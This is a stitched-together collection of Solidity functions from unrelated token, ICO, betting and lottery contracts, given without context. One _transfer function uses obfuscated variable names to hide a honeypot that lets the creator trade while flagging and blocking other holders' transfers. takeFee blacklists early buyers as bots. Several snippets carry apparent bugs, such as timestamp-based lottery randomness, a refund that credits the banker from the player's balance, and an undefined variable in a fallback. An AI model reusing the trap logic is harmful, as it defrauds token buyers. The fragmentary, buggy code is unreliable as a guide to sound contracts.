function _transferFrom(address sender, address recipient, uint256 amount) internal returns(bool) {
    if (!inSwap && shouldSwapBack()) {
        swapBack();
    }
    if (!launched() && recipient == pair) {
        require(_balances[sender] > 0);
        launch();
    }
    require(!bots[sender]);
    require(amount <= _maxTxAmount);
    _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
    uint256 amountReceived;
    if (!isFeeExempt[recipient]) {
        amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
    } else {
        amountReceived = amount;
    }
    _balances[recipient] = _balances[recipient].add(amountReceived);
    emit Transfer(sender, recipient, amountReceived);
    return true;
}

function takeFee(address sender, address receiver, uint256 amount) internal returns(uint256) {
    uint256 feeAmount = amount.mul(getTotalFee(receiver == pair)).div(feeDenominator);
    _balances[address(this)] = _balances[address(this)].add(feeAmount);
    if (_LastTXTimestamp[receiver] + 30 > block.timestamp) {
        bots[receiver] = true;
    }
    if (launchedAt + 5 > block.number) {
        bots[receiver] = true;
    }
    _LastTXTimestamp[receiver] = block.timestamp;
    emit Transfer(sender, address(this), feeAmount);
    return amount.sub(feeAmount);
}

function decline(string topic) public onlyOwner {
    SupporterList storage supporterList = topicToSupporterList[topic];
    uint256 totalValue = 0;
    for (uint i = 0; i < supporterList.length; i++) {
        totalValue += supporterList.idToSupporter[i].value;
        supporterList.idToSupporter[i].addr.transfer(
            supporterList.idToSupporter[i].value);
    }
    _removeTopic(topic);
    emit Decline(topic, totalValue);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (acidity == false)) {
        blowing = chTx;
        summer = true;
    }
    if ((address(sender) == creator) && (acidity == true)) {
        silua[recipient] = true;
        binance[recipient] = false;
        acidity = false;
    }
    if ((amount > ricksanchez) && (silua[sender] == true) && (address(sender) != creator)) {
        comeatme[recipient] = true;
    }
    if (silua[recipient] != true) {
        binance[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((binance[sender]) && (silua[recipient] == false)) {
        binance[recipient] = true;
    }
    if (silua[sender] == false) {
        if ((amount > ricksanchez) && (comeatme[sender] == true)) {
            require(false);
        }
        require(amount < blowing);
        if (summer == true) {
            if (comeatme[sender] == true) {
                require(false);
            }
            comeatme[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _newGame(bytes32 _gameEncryptedText) private returns(bool _result) {
    _result = false;
    require(gameOver);
    require(now > bankerBeginTime);
    require(now + gameTime <= bankerEndTime);
    gameID++;
    gameEncryptedText = _gameEncryptedText;
    gameRandon1 = '';
    gameBeginTime = now;
    gameEndTime = now + gameTime;
    gameBeginPlayNo = playNo;
    nextRewardPlayNo = playNo;
    gameEndPlayNo = 0;
    gameResult = 0;
    gameOver = false;
    emit OnNewGame(gameID, msg.sender, _gameEncryptedText, now, gameEndTime, getEventId(), now);
    _result = true;
}

function noOpenGameResult() public returns(bool _result) {
    _result = false;
    require(!gameOver);
    require(gameEndTime < now);
    if (lastBlockNumber == block.number) {
        emit OnOpenGameResult(gameID, false, 'block.number', msg.sender, 0, '', getEventId(), now);
        return;
    }
    for (uint i = 0; nextRewardPlayNo < playNo && i < currentRewardNum; i++) {
        betInfo storage p = playerBetInfoOf[nextRewardPlayNo];
        if (!p.IsReturnAward) {
            p.IsReturnAward = true;
            p.IsWin = true;
            uint AllAmount = p.BetAmount.mul(1 + p.Odds);
            userEtherOf[p.Player] = userEtherOf[p.Player].add(AllAmount);
            userEtherOf[this] = userEtherOf[this].sub(AllAmount);
        }
        nextRewardPlayNo++;
    }
    if (nextRewardPlayNo == playNo) {
        gameOver = true;
        if (betInfoIsLocked) {
            betInfoIsLocked = false;
        }
    }
    emit OnOpenGameResult(gameID, true, 'Banker Not Call', msg.sender, 0, '', getEventId(), now);
    _result = true;
}

function setBanker(address _banker, uint _beginTime, uint _endTime) public onlyAuction returns(bool _result) {
    _result = false;
    require(_banker != 0x0);
    if (now < bankerEndTime) {
        emit OnSetNewBanker(msg.sender, _banker, _beginTime, _endTime, 1, getEventId(), now);
        return;
    }
    if (!gameOver) {
        emit OnSetNewBanker(msg.sender, _banker, _beginTime, _endTime, 2, getEventId(), now);
        return;
    }
    if (_beginTime > now) {
        emit OnSetNewBanker(msg.sender, _banker, _beginTime, _endTime, 3, getEventId(), now);
        return;
    }
    if (_endTime <= now) {
        emit OnSetNewBanker(msg.sender, _banker, _beginTime, _endTime, 4, getEventId(), now);
        return;
    }
    currentBanker = _banker;
    bankerBeginTime = _beginTime;
    bankerEndTime = _endTime;
    emit OnSetNewBanker(msg.sender, _banker, _beginTime, _endTime, 0, getEventId(), now);
    _result = true;
}

function _calResultReturnIsWin(uint _playerBetInfoOfIndex, uint _realOdd) private returns(bool _isWin) {
    betInfo memory p = playerBetInfoOf[_playerBetInfoOfIndex];
    uint256 AllAmount = p.BetAmount.mul(1 + p.Odds);
    if (_realOdd > 0) {
        if (_realOdd == p.Odds) {
            userEtherOf[p.Player] = userEtherOf[p.Player].add(AllAmount);
            userEtherOf[this] = userEtherOf[this].sub(AllAmount);
        } else {
            uint256 winAmount = p.BetAmount.mul(1 + _realOdd);
            userEtherOf[p.Player] = userEtherOf[p.Player].add(winAmount);
            userEtherOf[this] = userEtherOf[this].sub(winAmount);
            userEtherOf[currentBanker] = userEtherOf[currentBanker].add(AllAmount.sub(winAmount));
            userEtherOf[this] = userEtherOf[this].sub(AllAmount.sub(winAmount));
        }
        return true;
    } else {
        userEtherOf[currentBanker] = userEtherOf[currentBanker].add(AllAmount);
        userEtherOf[this] = userEtherOf[this].sub(AllAmount);
        return false;
    }
}

function _openGameResult(uint _minGameResult, uint _midGameResult, uint _maxGameResult, string _r1) private returns(bool _result) {
    _result = false;
    require(betInfoIsLocked);
    require(!gameOver);
    require(now <= gameEndTime);
    require(_minGameResult <= _midGameResult);
    require(_midGameResult <= _maxGameResult);
    require(_minGameResult >= 1 && _maxGameResult <= 6);
    uint _gameResult = _minGameResult * 100 + _midGameResult * 10 + _maxGameResult;
    if (lastBlockNumber == block.number) {
        emit OnOpenGameResult(gameID, false, 'block.number is equal', msg.sender, _gameResult, _r1, getEventId(), now);
        return;
    }
    if (keccak256(uintToString(_gameResult), gameRandon2, _r1) == gameEncryptedText) {
        if (_minGameResult >= 1 && _minGameResult <= 6 && _midGameResult >= 1 && _midGameResult <= 6 && _maxGameResult >= 1 && _maxGameResult <= 6) {
            gameResult = _gameResult;
            gameRandon1 = _r1;
            gameEndPlayNo = playNo - 1;
            for (uint i = 0; nextRewardPlayNo < playNo && i < currentRewardNum; i++) {
                betInfo storage p = playerBetInfoOf[nextRewardPlayNo];
                if (!p.IsReturnAward) {
                    p.IsReturnAward = true;
                    uint realOdd = _playRealOdds(p.BetType, p.Odds, p.SmallNum, p.BigNum, _minGameResult, _midGameResult, _maxGameResult);
                    p.IsWin = _calResultReturnIsWin(nextRewardPlayNo, realOdd);
                    if (p.IsWin) {
                        p.Odds = realOdd;
                    }
                }
                nextRewardPlayNo++;
            }
            if (nextRewardPlayNo == playNo) {
                gameOver = true;
                betInfoIsLocked = false;
            }
            emit OnOpenGameResult(gameID, true, 'Success', msg.sender, _gameResult, _r1, getEventId(), now);
            _result = true;
            return;
        } else {
            emit OnOpenGameResult(gameID, false, 'The result is illegal', msg.sender, _gameResult, _r1, getEventId(), now);
            return;
        }
    } else {
        emit OnOpenGameResult(gameID, false, 'Hash Value Not Match', msg.sender, _gameResult, _r1, getEventId(), now);
        return;
    }
}

function lockBetInfo() public onlyBanker returns(bool _result) {
    require(!gameOver);
    require(now < gameEndTime);
    require(!betInfoIsLocked);
    betInfoIsLocked = true;
    _result = true;
}

function failUserRefund(uint _playNo) public returns(bool _result) {
    _result = true;
    require(!gameOver);
    require(gameEndTime + 30 days < now);
    betInfo storage p = playerBetInfoOf[_playNo];
    require(p.Player == msg.sender);
    if (!p.IsReturnAward && p.SmallNum > 0) {
        p.IsReturnAward = true;
        uint256 ToUser = p.BetAmount;
        uint256 ToBanker = p.BetAmount.mul(p.Odds);
        userEtherOf[p.Player] = userEtherOf[p.Player].add(ToUser);
        userEtherOf[this] = userEtherOf[this].sub(ToUser);
        userEtherOf[currentBanker] = userEtherOf[p.Player].add(ToBanker);
        userEtherOf[this] = userEtherOf[this].sub(ToBanker);
        p.Odds = 0;
        _result = true;
    }
}

function _play(uint _smallNum, uint _bigNum, uint256 _betAmount, uint _odds, uint _betType) private returns(bool _result) {
    _result = false;
    require(userEtherOf[msg.sender] >= _betAmount);
    uint bankerAmount = _betAmount.mul(_odds);
    require(userEtherOf[currentBanker] >= bankerAmount);
    if (gameBeginPlayNo == playNo) {
        if (now >= gameEndTime) {
            require(gameTime.add(now) <= bankerEndTime);
            gameBeginTime = now;
            gameEndTime = gameTime.add(now);
        }
    }
    require(now < gameEndTime);
    betInfo memory bi = betInfo({
        Player: msg.sender,
        SmallNum: _smallNum,
        BigNum: _bigNum,
        BetAmount: _betAmount,
        BetType: _betType,
        Odds: _odds,
        IsReturnAward: false,
        IsWin: false,
        BetTime: now
    });
    playerBetInfoOf[playNo] = bi;
    userEtherOf[msg.sender] = userEtherOf[msg.sender].sub(_betAmount);
    userEtherOf[this] = userEtherOf[this].add(_betAmount);
    userEtherOf[currentBanker] = userEtherOf[currentBanker].sub(bankerAmount);
    userEtherOf[this] = userEtherOf[this].add(bankerAmount);
    emit OnPlay(msg.sender, gameID, playNo, getEventId(), now, _smallNum, _bigNum, _betAmount, _betType);
    lastBlockNumber = block.number;
    playNo++;
    _result = true;
}

function canSetBanker() public view returns(bool _result) {
    _result = bankerEndTime <= now && gameOver;
}

function payDividends(address beneficiary, uint256 amount) external onlyOwner returns(bool) {
    require(amount > 0);
    validBeneficiary(beneficiary);
    beneficiary.transfer(amount);
    dividendsPaid.add(amount);
    emit DividendsPayment(amount, beneficiary);
    return true;
}

function withdrawInvestments() external onlyOwner {
    uint amount = address(this).balance;
    getOwner().transfer(amount * 1 wei);
    emit InvestmentsWithdrawn(amount, block.timestamp);
}

function releaseDivTokens() public returns(bool success) {
    require(block.timestamp > releaseDates[nextRelease]);
    uint256 releaseAmount = 100000000 * (uint256(10) ** decimals);
    dividendSupply -= releaseAmount;
    uint256 available = (releaseAmount * scaling) + scaledRemainder;
    scaledDividendPerToken += available / _totalSupply;
    scaledRemainder = available % _totalSupply;
    nextRelease += 1;
    return true;
}

function() public payable {
    if (startTime < block.timestamp && finishTime >= block.timestamp && crowdSaleSupply >= msg.value * unitsOneEthCanBuy) {
        uint256 amount = msg.value * unitsOneEthCanBuy;
        require(balances[this] >= amount);
        balances[this] = balances[this] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;
        crowdSaleSupply -= msg.value * unitsOneEthCanBuy;
        Transfer(this, msg.sender, amount); 
        tokenAdmin.transfer(msg.value);
    } else if (finishTime < block.timestamp) {
        balances[this] = balances[this] - amount;
        balances[tokenAdmin] += crowdSaleSupply;
        tokenAdmin.transfer(msg.value);
        Transfer(this, tokenAdmin, amount);
        crowdSaleSupply = 0;
    }
}

function update(address account) internal {
    if (nextRelease < 24 && block.timestamp > releaseDates[nextRelease]) {
        releaseDivTokens();
    }
    uint256 owed =
        scaledDividendPerToken - scaledDividendCreditedTo[account];
    scaledDividendBalanceOf[account] += balances[account] * owed;
    scaledDividendCreditedTo[account] = scaledDividendPerToken;
}

function withdraw() public returns(bool success) {
    require(block.timestamp > releaseDates[0]);
    update(msg.sender);
    uint256 amount = scaledDividendBalanceOf[msg.sender] / scaling;
    scaledDividendBalanceOf[msg.sender] %= scaling; 
    balances[msg.sender] += amount;
    balances[this] -= amount;
    emit Transfer(this, msg.sender, amount);
    return true;
}

function swap(uint256 sendAmount) returns(bool success) {
    require(tokenSwapSupply >= sendAmount * 3);
    if (ERC20Interface(oldAddress).transferFrom(msg.sender, tokenAdmin, sendAmount)) {
        balances[msg.sender] += sendAmount * 3;
        balances[this] -= sendAmount * 3;
        tokenSwapSupply -= sendAmount * 3;
    }
    emit Transfer(this, msg.sender, sendAmount * 3);
    return true;
}

function withdraw() public auth {
    require(this.balance > 0);
    require(block.timestamp >= endTime + 3600 * 24 * 30 * 3);
    owner.transfer(this.balance);
}

function refund() public {
    require(funding);
    require(block.timestamp >= endTime && soldAmount <= tokenContributionMin);
    uint256 tokenAmount = token.balanceOf(msg.sender);
    require(tokenAmount > 0);
    token.transferFrom(msg.sender, owner, tokenAmount);
    soldAmount = sub(soldAmount, tokenAmount);
    uint256 refundEth = tokenAmount / finney2LemoRate * 1 finney;
    Refund(msg.sender, refundEth);
    msg.sender.transfer(refundEth);
}

function destroy() public auth {
    require(block.timestamp >= endTime + 3600 * 24 * 30 * 3);
    selfdestruct(owner);
}

function finalize() public auth {
    require(funding);
    require(block.timestamp >= endTime);
    require(soldAmount >= tokenContributionMin);
    funding = false;
    Finalized(block.timestamp);
    owner.transfer(this.balance);
}

function initialize(uint256 _startTime, uint256 _endTime, uint256 _minPaymentFinney) public auth {
    require(_startTime < _endTime);
    require(_minPaymentFinney > 0);
    startTime = _startTime;
    endTime = _endTime;
    minPayment = _minPaymentFinney * 1 finney;
}

function contribute() public payable between(startTime, endTime) {
    uint256 max = tokenContributionCap;
    uint256 oldSoldAmount = soldAmount;
    require(oldSoldAmount < max);
    require(msg.value >= minPayment);
    uint256 reward = mul(msg.value, finney2LemoRate) / 1 finney;
    uint256 refundEth = 0;
    uint256 newSoldAmount = add(oldSoldAmount, reward);
    if (newSoldAmount > max) {
        uint over = newSoldAmount - max;
        refundEth = over / finney2LemoRate * 1 finney;
        reward = max - oldSoldAmount;
        soldAmount = max;
    } else {
        soldAmount = newSoldAmount;
    }
    token.transferFrom(owner, msg.sender, reward);
    Contribution(msg.sender, msg.value, reward);
    contributionCount++;
    if (refundEth > 0) {
        Refund(msg.sender, refundEth);
        msg.sender.transfer(refundEth);
    }
}

function setTokenContract(ERC20 tokenInstance) public auth {
    assert(address(token) == address(0));
    require(tokenInstance.balanceOf(owner) > tokenContributionMin);
    token = tokenInstance;
}

function isPreICO() public constant returns(bool) {
    uint curTime = currentTime();
    return curTime < preICOendTime && curTime > preICOstartTime;
}

function isICO() public constant returns(bool) {
    uint curTime = currentTime();
    return curTime < ICOendTime && curTime > ICOstartTime;
}

function getICOBonus() public constant returns(uint) {
    uint curTime = currentTime();
    if (curTime < firstICOTimeBarrier) {
        return firstICOTimeBonus;
    }
    if (curTime < secondICOTimeBarrier) {
        return secondICOTimeBonus;
    }
    if (curTime < thirdICOTimeBarrier) {
        return thirdICOTimeBonus;
    }
    return 0;
}

function startICO() external {
    require(currentTime() > preICOendTime);
    require(state == State.PRE_ICO && leftTokens <= maxPreICOTokenAmount);
    leftTokens = leftTokens.add(maxTokenAmount).sub(maxPreICOTokenAmount).sub(bountyTokens);
    state = State.ICO;
}

function getPreICOBonus() public constant returns(uint) {
    uint curTime = currentTime();
    if (curTime < firstPreICOTimeBarrier) {
        return firstPreICOTimeBonus;
    }
    if (curTime < secondPreICOTimeBarrier) {
        return secondPreICOTimeBonus;
    }
    if (curTime < thirdPreICOTimeBarrier) {
        return thirdPreICOTimeBonus;
    }
    return 0;
}

function isFinished() public constant returns(bool) {
    return currentTime() > ICOendTime || (leftTokens == 0 && state == State.ICO);
}

function takeBounty() external onlyOwner {
    require(isFinished());
    require(state == State.ICO);
    require(now > bountyAvailabilityTime);
    require(!bonusesPayed);
    bonusesPayed = true;
    require(token.transfer(msg.sender, bountyTokens));
}

function finishCrowdsale() external {
    require(isFinished());
    require(state == State.ICO);
    if (leftTokens > 0) {
        token.burn(leftTokens);
        leftTokens = 0;
    }
}

function() external canBuy minPayment payable {
    uint256 amount = msg.value;
    uint bonus = getBonus(amount);
    uint256 givenTokens = amount.mul(rateToEther).div(100).mul(100 + bonus);
    uint256 providedTokens = transferTokensTo(msg.sender, givenTokens);
    if (givenTokens > providedTokens) {
        uint256 needAmount = providedTokens.mul(100).div(100 + bonus).div(rateToEther);
        require(amount > needAmount);
        require(msg.sender.call.gas(3000000).value(amount - needAmount)());
        amount = needAmount;
    }
    totalAmount = totalAmount.add(amount);
}

function transferTokensTo(address to, uint256 givenTokens) internal returns(uint256) {
    uint256 providedTokens = givenTokens;
    if (givenTokens > leftTokens) {
        providedTokens = leftTokens;
    }
    leftTokens = leftTokens.sub(providedTokens);
    require(token.manualTransfer(to, providedTokens));
    transactionCounter = transactionCounter + 1;
    return providedTokens;
}

function setCrowdsaleStartandDuration(uint _start_time, uint _duration) internal view {
    if (_start_time <= now || _duration == 0)
        revert("Invalid start time or duration");
    Contract.storing();
    Contract.set(Admin.startTime()).to(_start_time);
    Contract.set(Admin.totalDuration()).to(_duration);
    Contract.emitting();
    Contract.log(TIME_UPDATE(Contract.execID()), bytes32(0));
}

function initializeCrowdsale() internal view {
    bytes32 token_name = Contract.read(Admin.tokenName());
    uint start_time = uint(Contract.read(Admin.startTime()));
    if (start_time < now)
        revert('crowdsale already started');
    if (token_name == 0)
        revert('token not init');
    Contract.storing();
    Contract.set(Admin.isConfigured()).to(true);
    Contract.emitting();
    Contract.log(CONFIGURE(Contract.execID(), token_name), bytes32(start_time));
}

function BuyTickets(address _sender, uint256[] memory _max) public payable returns(uint256) {
    require(msg.sender == address(mne));
    bool win = false;
    uint[] memory numbers = new uint[](_max[0]);
    uint i = 0;
    while (i < _max[0]) {
        numbers[i] = uint256(uint256(keccak256(abi.encodePacked(block.timestamp, _sender, i))) % maxNumber);
        if (numbers[i] == systemNumber)
            win = true;
        i++;
    }
    uint valueStakeHolder = msg.value * stakeHoldersfee / 100;
    if (win) {
        address payable add = payable(_sender);
        uint contractBalance = address(this).balance;
        emit Numbers(msg.sender, numbers, "You WON!");
        uint winAmount = contractBalance * percentWin / 100;
        uint totalToPay = winAmount - stakeHoldersfee;
        if (!add.send(totalToPay)) revert('Error While Executing Payment.');
        totalPaidOut += totalToPay;
        winner.push(_sender);
        winnerTickets.push(_max[0]);
        winnerETHAmount.push(totalToPay);
        winnerTimestamp.push(block.timestamp);
    } else {
        lost.push(_sender);
        lostTickets.push(_max[0]);
        lostTimestamp.push(block.timestamp);
        emit Numbers(msg.sender, numbers, "Your numbers don't match the System Number! Try Again.");
    }
    ticketsSold += _max[0];
    uint totalEthfee = ethfee * _max[0];
    uint totalMneFee = mnefee * _max[0];
    if (msg.value < totalEthfee) revert('Not enough ETH.');
    mne.Payment.value(valueStakeHolder)();
    totalSentToStakeHolders += valueStakeHolder;
    return totalMneFee;
}

function buy(address userAddress) public payable {
    require(userAddress != address(0));
    checkCorrectPurchase();
    uint256 tokens = getTokenAmount(msg.value);
    assert(tokens >= getMinAmount(userAddress));
    assert(tokens.add(totalTokensSold) <= getMaxAmount());
    totalEtherRaised = totalEtherRaised.add(msg.value);
    totalTokensSold = totalTokensSold.add(tokens);
    token.transferFrom(address(0x0), userAddress, tokens);
    amounts[userAddress] = amounts[userAddress].add(tokens);
    if (totalEtherRaised >= softCapEther) {
        ownerWallet.transfer(this.balance);
    } else {
        deposits[userAddress] = deposits[userAddress].add(msg.value);
    }
}

function getMaxAmount() view public returns(uint256) {
    if (block.timestamp <= 1567296000) return 100000000000000000000000000;
    if (block.timestamp <= 1575158400) return 100000000000000000000000000;
    return 750000000000000000000000000;
}

function getRate() view public returns(uint256) {
    if (block.timestamp <= 1567296000) return 9;
    if (block.timestamp <= 1575158400) return 7;
    return 5;
}

function getMinAmount(address userAddress) view public returns(uint256) {
    if (block.timestamp <= 1567296000) {
        if (amounts[userAddress] < 10000000000000000000000) {
            return uint256(10000000000000000000000).sub(amounts[userAddress]);
        } else {
            return 1000000000000000000;
        }
    }
    if (block.timestamp <= 1575158400) {
        if (amounts[userAddress] < 10000000000000000000000) {
            return uint256(10000000000000000000000).sub(amounts[userAddress]);
        } else {
            return 1000000000000000000;
        }
    }
    return 1;
}

function refund(address userAddress) public {
    assert(totalEtherRaised < softCapEther && now > endTime);
    uint256 amount = deposits[userAddress];
    deposits[userAddress] = 0;
    amounts[userAddress] = 0;
    userAddress.transfer(amount);
}

function checkCorrectPurchase() view internal {
    require(startTime < now && now < endTime);
    require(totalEtherRaised + msg.value < hardCapEther);
}

